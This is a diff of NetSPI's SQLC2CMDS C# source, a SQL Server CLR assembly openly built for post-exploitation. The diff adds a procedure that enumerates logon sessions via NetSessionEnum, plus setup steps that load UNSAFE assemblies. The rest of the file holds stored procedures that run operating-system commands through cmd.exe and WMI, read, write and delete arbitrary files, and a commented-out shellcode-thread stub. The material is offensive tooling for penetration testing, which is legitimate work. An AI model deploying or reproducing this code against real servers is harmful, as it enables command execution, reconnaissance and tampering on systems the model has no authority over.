@@ -2,6 +2,7 @@
 
 Author: Scott Sutherland, NetSPI (2018)
 Application: SQLC2CMDS.dll
+Version: 1.1
 Description: 
 
 This .net DLL is intended to be imported into SQL Server and used during post exploitation activies.  
@@ -56,6 +57,13 @@ Additional Instructions:
     FROM 'c:\temp\SQLC2CMDS.dll'
     WITH PERMISSION_SET = UNSAFE;
 
+4. Import required library.
+
+    -- Load dependency
+    CREATE ASSEMBLY [System.Management] AUTHORIZATION dbo 
+    FROM 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Management.dll'
+    WITH PERMISSION_SET = UNSAFE 
+
 4. Map the SQLC2CMDS to stored procedures.
 
     CREATE PROCEDURE [dbo].[run_query] @execTsql NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[run_query]; 
@@ -77,6 +85,8 @@ Additional Instructions:
     CREATE PROCEDURE [dbo].[EncryptThis] @MyString NVARCHAR (4000),@MyKey NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[EncryptThis]; 
     GO
     CREATE PROCEDURE [dbo].[DecryptThis] @MyString NVARCHAR (4000),@MyKey NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[DecryptThis]; 
+    GO
+    CREATE PROCEDURE [dbo].[run_getusercon] AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[run_getusercon]; 
     GO
 
 5. Run tests for each of the available stored procedure.
@@ -110,6 +120,9 @@ Additional Instructions:
     -- Decrypt an encrypted string with provided key
     decryptthis 'EAAAAIUSQtbiDvP3c8L/fuNoQ8q/zUwMD8Cd/UbCmiVnopTX','password'
 
+    -- run with no parameters, and shows logon sessions
+    run_getusercon
+
 5. Remove all added stored procedures and the SQLC2CMDS assembly.
 
     drop procedure run_query
@@ -122,6 +135,7 @@ Additional Instructions:
     drop procedure remove_file
     drop procedure encryptthis
     drop procedure decryptthis
+    run_getusercon
     drop assembly SQLC2CMDS
  */
 
@@ -136,9 +150,6 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
-//using System.Management.Automation;
-//using System.Management.Automation.Runspaces;
-//using System.Management.Automation.Internal;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
@@ -161,25 +172,25 @@ public static class SqlHelper
     {
         typeMap = new Dictionary<Type, SqlDbType>();
 
-        typeMap[typeof(string)]         = SqlDbType.NVarChar;
-        typeMap[typeof(char[])]         = SqlDbType.NVarChar;
-        typeMap[typeof(byte)]           = SqlDbType.TinyInt;
-        typeMap[typeof(byte[])]         = SqlDbType.Image;        
+        typeMap[typeof(string)] = SqlDbType.NVarChar;
+        typeMap[typeof(char[])] = SqlDbType.NVarChar;
+        typeMap[typeof(byte)] = SqlDbType.TinyInt;
+        typeMap[typeof(byte[])] = SqlDbType.Image;
         //typeMap[typeof(sbyte)]        = SqlDbType.TinyInt; - not sure of sqldbtype
         //typeMap[typeof(ushort)]       = SqlDbType.TinyInt; - not sure of sqldbtype
         //typeMap[typeof(uint)]         = SqlDbType.TinyInt; - not sure of sqldbtype
         //typeMap[typeof(ulong)]        = SqlDbType.TinyInt; - not sure of sqldbtype   
         //typeMap[typeof(DateSpan)]     = SqlDbType.TinyInt; - not sure of sqldbtype              
-        typeMap[typeof(short)]          = SqlDbType.SmallInt;
-        typeMap[typeof(int)]            = SqlDbType.Int;
-        typeMap[typeof(long)]           = SqlDbType.BigInt;
-        typeMap[typeof(bool)]           = SqlDbType.Bit;
-        typeMap[typeof(DateTime)]       = SqlDbType.DateTime2;
+        typeMap[typeof(short)] = SqlDbType.SmallInt;
+        typeMap[typeof(int)] = SqlDbType.Int;
+        typeMap[typeof(long)] = SqlDbType.BigInt;
+        typeMap[typeof(bool)] = SqlDbType.Bit;
+        typeMap[typeof(DateTime)] = SqlDbType.DateTime2;
         typeMap[typeof(DateTimeOffset)] = SqlDbType.DateTimeOffset;
-        typeMap[typeof(decimal)]        = SqlDbType.Money;
-        typeMap[typeof(float)]          = SqlDbType.Real;
-        typeMap[typeof(double)]         = SqlDbType.Float;
-        typeMap[typeof(TimeSpan)]       = SqlDbType.Time;
+        typeMap[typeof(decimal)] = SqlDbType.Money;
+        typeMap[typeof(float)] = SqlDbType.Real;
+        typeMap[typeof(double)] = SqlDbType.Float;
+        typeMap[typeof(TimeSpan)] = SqlDbType.Time;
     }
 
     // Non-generic argument-based method
@@ -221,16 +232,16 @@ public partial class StoredProcedures
     // https://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnectionstringbuilder(v=vs.110).aspx
     // No error handling when object does not exist
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void run_query (SqlString execTsql)
+    public static void run_query(SqlString execTsql)
     {
         // Run as calling SQL/Windows login    
-        using(SqlConnection connection = new SqlConnection("context connection=true"))   
-        {  
-            connection.Open();  
-            SqlCommand command = new SqlCommand(execTsql.ToString(), connection);  
-            SqlContext.Pipe.ExecuteAndSend(command);   
-            connection.Close();  
-        }            
+        using (SqlConnection connection = new SqlConnection("context connection=true"))
+        {
+            connection.Open();
+            SqlCommand command = new SqlCommand(execTsql.ToString(), connection);
+            SqlContext.Pipe.ExecuteAndSend(command);
+            connection.Close();
+        }
     }
 
     // --------------------------------------------------
@@ -244,7 +255,7 @@ public partial class StoredProcedures
     // Need to add auto identification of the current instance.
     // No error handling when object does not exist. Need to add variables so it can be used as an alternative to ad-hoc queries.
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void run_query2 (SqlString execTsql)
+    public static void run_query2(SqlString execTsql)
     {
 
         // user connection string builder here, accept query, server, current, user, password - execute as system by default, accept windows creds, sql creds
@@ -258,70 +269,74 @@ public partial class StoredProcedures
             SqlDataReader reader = command.ExecuteReader();
 
             // Create List for Columns
-            List<SqlMetaData> OutputColumns = new List<SqlMetaData>(reader.FieldCount); 
+            List<SqlMetaData> OutputColumns = new List<SqlMetaData>(reader.FieldCount);
 
             // Get schema
-            DataTable schemaTable = reader.GetSchemaTable();            
+            DataTable schemaTable = reader.GetSchemaTable();
 
             // Get column names, types, and sizes from reader
-            for(int i=0;i<reader.FieldCount;i++)
-            {       
+            for (int i = 0; i < reader.FieldCount; i++)
+            {
                 // Check if char and string types
-                if(typeof(char).Equals(reader.GetFieldType(i)) || typeof(string).Equals(reader.GetFieldType(i)))
+                if (typeof(char).Equals(reader.GetFieldType(i)) || typeof(string).Equals(reader.GetFieldType(i)))
                 {
-                    SqlMetaData OutputColumn = new SqlMetaData(reader.GetName(i),SqlHelper.GetDbType(reader.GetFieldType(i)),4000); 
-                    OutputColumns.Add(OutputColumn); 
-                }else{
+                    SqlMetaData OutputColumn = new SqlMetaData(reader.GetName(i), SqlHelper.GetDbType(reader.GetFieldType(i)), 4000);
+                    OutputColumns.Add(OutputColumn);
+                }
+                else
+                {
 
                     // Anything other type
-                    SqlMetaData OutputColumn = new SqlMetaData(reader.GetName(i),SqlHelper.GetDbType(reader.GetFieldType(i))); 
-                    OutputColumns.Add(OutputColumn); 
-                }  
-            }                   
+                    SqlMetaData OutputColumn = new SqlMetaData(reader.GetName(i), SqlHelper.GetDbType(reader.GetFieldType(i)));
+                    OutputColumns.Add(OutputColumn);
+                }
+            }
 
             // Create the record and specify the metadata for the columns.
             SqlDataRecord record = new SqlDataRecord(OutputColumns.ToArray());
 
             // Mark the begining of the result-set.
             SqlContext.Pipe.SendResultsStart(record);
-           
-           // Check for rows
-           if (reader.HasRows)
-           {                
+
+            // Check for rows
+            if (reader.HasRows)
+            {
                 while (reader.Read())
-                {    
+                {
                     // Iterate through column count, set value for each column in row
                     for (int i = 0; i < reader.FieldCount; i++)
                     {
                         // Add value to the current row/column
-                        record.SetValue(i, reader[i]);  
+                        record.SetValue(i, reader[i]);
                     }
 
                     // Send the row back to the client.
-                    SqlContext.Pipe.SendResultsRow(record);   
-                } 
+                    SqlContext.Pipe.SendResultsRow(record);
+                }
 
-           }else{    
+            }
+            else
+            {
 
                 // Set values for each column in the row
-                record.SetString(0,"No rows found.");
+                record.SetString(0, "No rows found.");
 
                 // Send the row back to the client.
-                SqlContext.Pipe.SendResultsRow(record);                  
-           }
+                SqlContext.Pipe.SendResultsRow(record);
+            }
 
             // Mark the end of the result-set.
-            SqlContext.Pipe.SendResultsEnd(); 
+            SqlContext.Pipe.SendResultsEnd();
 
             connection.Close();
-        }          
+        }
     }
-    
+
     // --------------------------------------------------
     // Function - run_command
     // --------------------------------------------------     
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void run_command (SqlString execCommand)
+    public static void run_command(SqlString execCommand)
     {
         Process proc = new Process();
         proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
@@ -331,16 +346,16 @@ public partial class StoredProcedures
         proc.Start();
 
         // Create the record and specify the metadata for the columns.
-	    SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
-	    // Mark the begining of the result-set.
-	    SqlContext.Pipe.SendResultsStart(record);
+        // Mark the begining of the result-set.
+        SqlContext.Pipe.SendResultsStart(record);
 
         // Set values for each column in the row
-	    record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
 
         // Send the row back to the client.
-	    SqlContext.Pipe.SendResultsRow(record);
+        SqlContext.Pipe.SendResultsRow(record);
 
         // Mark the end of the result-set.
         SqlContext.Pipe.SendResultsEnd();
@@ -350,31 +365,113 @@ public partial class StoredProcedures
     }
 
     // --------------------------------------------------
+    // Function - run_getusercon
+    // --------------------------------------------------
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SESSION_INFO_10
+    {
+        [MarshalAs(UnmanagedType.LPWStr)] public string OriginatingHost;
+        [MarshalAs(UnmanagedType.LPWStr)] public string DomainUser;
+        public uint SessionTime;
+        public uint IdleTime;
+    }
+
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    public static extern int NetSessionEnum
+            (
+             string srvName,
+             string cltName,
+             string usrName,
+             int level,
+             out IntPtr bufPtr,
+             int prefmaxlen,
+             out int entriesread,
+             out int totalentries,
+             ref IntPtr resume_handle
+            );
+
+    ///<summary>NetApiBufferFree</summary>
+    [DllImport("netapi32.dll", ExactSpelling = true)]
+    public extern static int NetApiBufferFree(IntPtr bufptr);
+
+    ///<summary>ERROR_MORE_DATA</summary>
+    public const int ERROR_MORE_DATA = 234;
+
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void run_getusercon()
+    {
+
+      
+        int read, total, s;
+        IntPtr ptr, rhandle = IntPtr.Zero;
+        Type typ = typeof(SESSION_INFO_10);
+        int size = Marshal.SizeOf(typ);
+        SESSION_INFO_10 si;
+        s = NetSessionEnum("127.0.0.1", "", "", 10, out ptr, -1, out read, out total, ref rhandle);
+
+        long run = (long)ptr;
+
+        for (int i = 0; i < read; i++)
+      {
+          
+
+          // Create the record and specify the metadata for the columns.
+          SqlDataRecord record = new SqlDataRecord(new SqlMetaData("SourceHost", SqlDbType.NVarChar, 4000),
+                                                   new SqlMetaData("DomainUser", SqlDbType.NVarChar, 4000),
+                                                   new SqlMetaData("SessionTime", SqlDbType.NVarChar, 4000),    
+                                                   new SqlMetaData("IdleTime", SqlDbType.NVarChar, 4000));
+
+          // Mark the begining of the result-set.
+          SqlContext.Pipe.SendResultsStart(record);
+
+          // Convert data from memory into the data structure
+          si = (SESSION_INFO_10)Marshal.PtrToStructure((IntPtr)run, typ);
+
+          // Set values for each column in the row using the structure
+          record.SetString(0, si.OriginatingHost);
+          record.SetString(1, si.DomainUser);
+          record.SetString(2, si.SessionTime.ToString());
+          record.SetString(3, si.IdleTime.ToString());
+
+          // Send the row back to the client.
+          SqlContext.Pipe.SendResultsRow(record);
+
+          // Mark the end of the result-set.
+          SqlContext.Pipe.SendResultsEnd();
+          run += size;
+
+      }
+      NetApiBufferFree(ptr);
+      ptr = IntPtr.Zero;
+       
+    }
+
+    // --------------------------------------------------
     // Function - run_command_wmi
     // -------------------------------------------------- 
     // Add remote server option.
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void run_command_wmi (SqlString execCommand)
+    public static void run_command_wmi(SqlString execCommand)
     {
-        object[] theProcessToRun = {execCommand};
+        object[] theProcessToRun = { execCommand };
         ManagementClass mClass = new ManagementClass(@"\\" + "127.0.0.1" + @"\root\cimv2:Win32_Process");
         mClass.InvokeMethod("Create", theProcessToRun);
-        
-        // Create the record and specify the metadata for the columns.
-	    SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
-	    // Mark the begining of the result-set.
-	    SqlContext.Pipe.SendResultsStart(record);
+        // Create the record and specify the metadata for the columns.
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+
+        // Mark the begining of the result-set.
+        SqlContext.Pipe.SendResultsStart(record);
 
         // Set values for each column in the row
-	    record.SetString(0, "WMI command executed");
+        record.SetString(0, "WMI command executed");
 
         // Send the row back to the client.
-	    SqlContext.Pipe.SendResultsRow(record);
+        SqlContext.Pipe.SendResultsRow(record);
 
         // Mark the end of the result-set.
         SqlContext.Pipe.SendResultsEnd();
-    }    
+    }
 
     // add wrapper for c++ code in c#
     // https://andrearegoli.wordpress.com/2013/09/10/shellexecute-and-execute-file-in-c/
@@ -384,40 +481,42 @@ public partial class StoredProcedures
     // Function - write_file
     // -------------------------------------------------- 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void write_file (SqlString filePath,SqlString fileContent)
+    public static void write_file(SqlString filePath, SqlString fileContent)
     {
         // Write provided file content to provided file path
-        System.IO.File.AppendAllText(filePath.Value, fileContent.Value);    
+        System.IO.File.AppendAllText(filePath.Value, fileContent.Value);
 
         // Create the record and specify the metadata for the columns.
         SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
         // Mark the begining of the result-set.
-        SqlContext.Pipe.SendResultsStart(record);        
+        SqlContext.Pipe.SendResultsStart(record);
 
         // This text is added only once to the file.
         if (File.Exists(filePath.Value))
         {
             // Set values for each column in the row
             record.SetString(0, "Conent was written.");
-        }else{
+        }
+        else
+        {
 
             // Set values for each column in the row
-            record.SetString(0, "Conent was written.");            
-        }       
+            record.SetString(0, "Conent was written.");
+        }
 
         // Send the row back to the client.
         SqlContext.Pipe.SendResultsRow(record);
 
         // Mark the end of the result-set.
-        SqlContext.Pipe.SendResultsEnd();        
+        SqlContext.Pipe.SendResultsEnd();
     }
 
     // --------------------------------------------------
     // Function - read_file
     // -------------------------------------------------- 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void read_file (String filePath)
+    public static void read_file(String filePath)
     {
         // https://msdn.microsoft.com/en-us/library/ms143368(v=vs.110).aspx
 
@@ -425,32 +524,34 @@ public partial class StoredProcedures
         SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
         // Mark the begining of the result-set.
-        SqlContext.Pipe.SendResultsStart(record); 
+        SqlContext.Pipe.SendResultsStart(record);
 
         // This text is added only once to the file.
         if (File.Exists(filePath))
-        {      
+        {
             // Open the file to read from.
             string readText = File.ReadAllText(filePath);
-    
+
             // Write output
-            record.SetString(0, readText.ToString());  
-        }else{
-             record.SetString(0, "The file does not exist.");  
+            record.SetString(0, readText.ToString());
+        }
+        else
+        {
+            record.SetString(0, "The file does not exist.");
         }
 
         // Send the row back to the client.
         SqlContext.Pipe.SendResultsRow(record);
 
         // Mark the end of the result-set.
-        SqlContext.Pipe.SendResultsEnd();                    
-    }    
+        SqlContext.Pipe.SendResultsEnd();
+    }
 
     // --------------------------------------------------
     // Function - remove_file
     // -------------------------------------------------- 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void remove_file (String filePath)
+    public static void remove_file(String filePath)
     {
         // https://msdn.microsoft.com/en-us/library/ms143368(v=vs.110).aspx
 
@@ -458,28 +559,33 @@ public partial class StoredProcedures
         SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
         // Mark the begining of the result-set.
-        SqlContext.Pipe.SendResultsStart(record); 
+        SqlContext.Pipe.SendResultsStart(record);
 
         // This text is added only once to the file.
         if (File.Exists(filePath))
-        {      
+        {
             // Attempt to remove the file
-            try{                
+            try
+            {
                 File.Delete(filePath);
-                record.SetString(0, "The file was removed.");  
-            }catch{
-                record.SetString(0, "The file could not be removed.");  
+                record.SetString(0, "The file was removed.");
             }
-        }else{
-             record.SetString(0, "The file does not exist.");  
+            catch
+            {
+                record.SetString(0, "The file could not be removed.");
+            }
+        }
+        else
+        {
+            record.SetString(0, "The file does not exist.");
         }
 
         // Send the row back to the client.
         SqlContext.Pipe.SendResultsRow(record);
 
         // Mark the end of the result-set.
-        SqlContext.Pipe.SendResultsEnd();                    
-    }      
+        SqlContext.Pipe.SendResultsEnd();
+    }
 
     // --------------------------------------------------
     // Marshaling Native Functions
@@ -509,259 +615,259 @@ public partial class StoredProcedures
         var threadId = IntPtr.Zero;
         CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, ref threadId);
         */
-    }     
+    }
 
     //////////////////////////////////////////////////////////////////////////////////////////////////////
     // Crypto functions //////////////////////////////////////////////////////////////////////////////////
     //////////////////////////////////////////////////////////////////////////////////////////////////////         
 
-        // --------------------------------------------------
-        // Function: EncryptThis
-        // --------------------------------------------------  
-        // Source: https://stackoverflow.com/questions/202011/encrypt-and-decrypt-a-string
-        // Reference: https://msdn.microsoft.com/en-us/library/system.security.cryptography.aes(v=vs.110).aspx
-        [Microsoft.SqlServer.Server.SqlProcedure]
-        public static void EncryptThis (SqlString MyString,SqlString MyKey)
-        {           
-            try
+    // --------------------------------------------------
+    // Function: EncryptThis
+    // --------------------------------------------------  
+    // Source: https://stackoverflow.com/questions/202011/encrypt-and-decrypt-a-string
+    // Reference: https://msdn.microsoft.com/en-us/library/system.security.cryptography.aes(v=vs.110).aspx
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void EncryptThis(SqlString MyString, SqlString MyKey)
+    {
+        try
+        {
+            string encrypted64 = EncryptStringAES(string.Format(MyString.Value), string.Format(MyKey.Value));
+
+            // Create the record and specify the metadata for the columns.
+            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+
+            // Mark the begining of the result-set.
+            SqlContext.Pipe.SendResultsStart(record);
+
+            // Set values for each column in the row
+            record.SetString(0, encrypted64);
+
+            // Send the row back to the client.
+            SqlContext.Pipe.SendResultsRow(record);
+
+            // Mark the end of the result-set.
+            SqlContext.Pipe.SendResultsEnd();
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine("Error: {0}", e.Message);
+        }
+    }
+
+    // --------------------------------------------------
+    // Function: DecryptThis
+    // --------------------------------------------------                 
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void DecryptThis(SqlString MyString, SqlString MyKey)
+    {
+        try
+        {
+            string decrypted = DecryptStringAES(string.Format(MyString.Value), string.Format(MyKey.Value));
+
+            // Create the record and specify the metadata for the columns.
+            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+
+            // Mark the begining of the result-set.
+            SqlContext.Pipe.SendResultsStart(record);
+
+            // Set values for each column in the row
+            record.SetString(0, decrypted);
+
+            // Send the row back to the client.
+            SqlContext.Pipe.SendResultsRow(record);
+
+            // Mark the end of the result-set.
+            SqlContext.Pipe.SendResultsEnd();
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine("Error: {0}", e.Message);
+        }
+    }
+
+    // Set salt - May not want the salt to be static long term :P
+    private static byte[] _salt = Encoding.Unicode.GetBytes("CaptainSalty");
+
+    public static string EncryptStringAES(string plainText, string sharedSecret)
+    {
+        if (string.IsNullOrEmpty(plainText))
+            throw new ArgumentNullException("plainText");
+        if (string.IsNullOrEmpty(sharedSecret))
+            throw new ArgumentNullException("sharedSecret");
+
+        string outStr = null;                       // Encrypted string to return
+        RijndaelManaged aesAlg = null;              // RijndaelManaged object used to encrypt the data.
+
+        try
+        {
+            // generate the key from the shared secret and the salt
+            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
+
+            // Create a RijndaelManaged object
+            aesAlg = new RijndaelManaged();
+            aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
+            aesAlg.Mode = CipherMode.ECB;
+
+            // Create a decryptor to perform the stream transform.
+            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
+
+            // Create the streams used for encryption.
+            using (MemoryStream msEncrypt = new MemoryStream())
             {
-                string encrypted64 = EncryptStringAES(string.Format(MyString.Value),string.Format(MyKey.Value));
-        
-                // Create the record and specify the metadata for the columns.
-                SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
-
-                // Mark the begining of the result-set.
-                SqlContext.Pipe.SendResultsStart(record);
-
-                // Set values for each column in the row
-                record.SetString(0, encrypted64);
-
-                // Send the row back to the client.
-                SqlContext.Pipe.SendResultsRow(record);
-
-                // Mark the end of the result-set.
-                SqlContext.Pipe.SendResultsEnd();
+                // prepend the IV
+                msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
+                msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
+                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                {
+                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                    {
+                        //Write all data to the stream.
+                        swEncrypt.Write(plainText);
+                    }
+                }
+                outStr = Convert.ToBase64String(msEncrypt.ToArray());
             }
-            catch (Exception e)
-            {
-                Console.WriteLine("Error: {0}", e.Message);
-            }					
+        }
+        finally
+        {
+            // Clear the RijndaelManaged object.
+            if (aesAlg != null)
+                aesAlg.Clear();
         }
 
-        // --------------------------------------------------
-        // Function: DecryptThis
-        // --------------------------------------------------                 
-        [Microsoft.SqlServer.Server.SqlProcedure]
-        public static void DecryptThis (SqlString MyString, SqlString MyKey)
-        {           
-            try
-            {
-                string decrypted = DecryptStringAES(string.Format(MyString.Value),string.Format(MyKey.Value));
-        
-                // Create the record and specify the metadata for the columns.
-                SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+        // Return the encrypted bytes from the memory stream.
+        return outStr;
+    }
 
-                // Mark the begining of the result-set.
-                SqlContext.Pipe.SendResultsStart(record);
+    public static string DecryptStringAES(string cipherText, string sharedSecret)
+    {
+        if (string.IsNullOrEmpty(cipherText))
+            throw new ArgumentNullException("cipherText");
+        if (string.IsNullOrEmpty(sharedSecret))
+            throw new ArgumentNullException("sharedSecret");
 
-                // Set values for each column in the row
-                record.SetString(0, decrypted);
+        // Declare the RijndaelManaged object
+        // used to decrypt the data.
+        RijndaelManaged aesAlg = null;
 
-                // Send the row back to the client.
-                SqlContext.Pipe.SendResultsRow(record);
+        // Declare the string used to hold
+        // the decrypted text.
+        string plaintext = null;
 
-                // Mark the end of the result-set.
-                SqlContext.Pipe.SendResultsEnd();
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("Error: {0}", e.Message);
-            }					
-        }	
-
-        // Set salt - May not want the salt to be static long term :P
-        private static byte[] _salt = Encoding.Unicode.GetBytes("CaptainSalty");
-
-        public static string EncryptStringAES(string plainText, string sharedSecret)
+        try
         {
-            if (string.IsNullOrEmpty(plainText))
-                throw new ArgumentNullException("plainText");
-            if (string.IsNullOrEmpty(sharedSecret))
-                throw new ArgumentNullException("sharedSecret");
+            // generate the key from the shared secret and the salt
+            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
 
-            string outStr = null;                       // Encrypted string to return
-            RijndaelManaged aesAlg = null;              // RijndaelManaged object used to encrypt the data.
-
-            try
+            // Create the streams used for decryption.                
+            byte[] bytes = Convert.FromBase64String(cipherText);
+            using (MemoryStream msDecrypt = new MemoryStream(bytes))
             {
-                // generate the key from the shared secret and the salt
-                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
-
                 // Create a RijndaelManaged object
+                // with the specified key and IV.
                 aesAlg = new RijndaelManaged();
                 aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                 aesAlg.Mode = CipherMode.ECB;
 
-                // Create a decryptor to perform the stream transform.
-                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
-
-                // Create the streams used for encryption.
-                using (MemoryStream msEncrypt = new MemoryStream())
+                // Get the initialization vector from the encrypted stream
+                aesAlg.IV = ReadByteArray(msDecrypt);
+                // Create a decrytor to perform the stream transform.
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                 {
-                    // prepend the IV
-                    msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
-                    msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
-                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
-                    {
-                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
-                        {
-                            //Write all data to the stream.
-                            swEncrypt.Write(plainText);
-                        }
-                    }
-                    outStr = Convert.ToBase64String(msEncrypt.ToArray());
+                    using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+
+                        // Read the decrypted bytes from the decrypting stream
+                        // and place them in a string.
+                        plaintext = srDecrypt.ReadToEnd();
                 }
             }
-            finally
-            {
-                // Clear the RijndaelManaged object.
-                if (aesAlg != null)
-                    aesAlg.Clear();
-            }
-
-            // Return the encrypted bytes from the memory stream.
-            return outStr;
+        }
+        finally
+        {
+            // Clear the RijndaelManaged object.
+            if (aesAlg != null)
+                aesAlg.Clear();
         }
 
-        public static string DecryptStringAES(string cipherText, string sharedSecret)
+        return plaintext;
+    }
+
+    private static byte[] ReadByteArray(Stream s)
+    {
+        byte[] rawLength = new byte[sizeof(int)];
+        if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
         {
-            if (string.IsNullOrEmpty(cipherText))
-                throw new ArgumentNullException("cipherText");
-            if (string.IsNullOrEmpty(sharedSecret))
-                throw new ArgumentNullException("sharedSecret");
-
-            // Declare the RijndaelManaged object
-            // used to decrypt the data.
-            RijndaelManaged aesAlg = null;
-
-            // Declare the string used to hold
-            // the decrypted text.
-            string plaintext = null;
-
-            try
-            {
-                // generate the key from the shared secret and the salt
-                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
-
-                // Create the streams used for decryption.                
-                byte[] bytes = Convert.FromBase64String(cipherText);
-                using (MemoryStream msDecrypt = new MemoryStream(bytes))
-                {
-                    // Create a RijndaelManaged object
-                    // with the specified key and IV.
-                    aesAlg = new RijndaelManaged();
-                    aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
-                    aesAlg.Mode = CipherMode.ECB;
-                    
-                    // Get the initialization vector from the encrypted stream
-                    aesAlg.IV = ReadByteArray(msDecrypt);
-                    // Create a decrytor to perform the stream transform.
-                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
-                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
-                    {
-                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
-
-                            // Read the decrypted bytes from the decrypting stream
-                            // and place them in a string.
-                            plaintext = srDecrypt.ReadToEnd();
-                    }
-                }
-            }
-            finally
-            {
-                // Clear the RijndaelManaged object.
-                if (aesAlg != null)
-                    aesAlg.Clear();
-            }
-
-            return plaintext;
+            throw new SystemException("Stream did not contain properly formatted byte array");
         }
 
-        private static byte[] ReadByteArray(Stream s)
+        byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
+        if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
         {
-            byte[] rawLength = new byte[sizeof(int)];
-            if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
-            {
-                throw new SystemException("Stream did not contain properly formatted byte array");
-            }
+            throw new SystemException("Did not read byte array properly");
+        }
 
-            byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
-            if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
-            {
-                throw new SystemException("Did not read byte array properly");
-            }
-
-            return buffer;
-        }		    
+        return buffer;
+    }
 
     //////////////////////////////////////////////////////////////////////////////////////////////////////
     // Pending functions /////////////////////////////////////////////////////////////////////////////////
     //////////////////////////////////////////////////////////////////////////////////////////////////////       
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void read_file_bin (SqlString filePath)
+    public static void read_file_bin(SqlString filePath)
     {
         // Read binary file contents 
         // https://gist.github.com/nullbind/34c63d169fadb213753c6d94567ba85c
-    }           
+    }
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void write_file_bin (SqlString filePath,SqlString fileContent)
+    public static void write_file_bin(SqlString filePath, SqlString fileContent)
     {
 
         // Write binary file content to provided file path
         // https://gist.github.com/nullbind/34c63d169fadb213753c6d94567ba85c 
-    }       
+    }
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void read_registry_property (SqlString regPath,SqlString regKey,SqlString regProperty)
+    public static void read_registry_property(SqlString regPath, SqlString regKey, SqlString regProperty)
     {
 
-    }            
-
-     [Microsoft.SqlServer.Server.SqlProcedure]
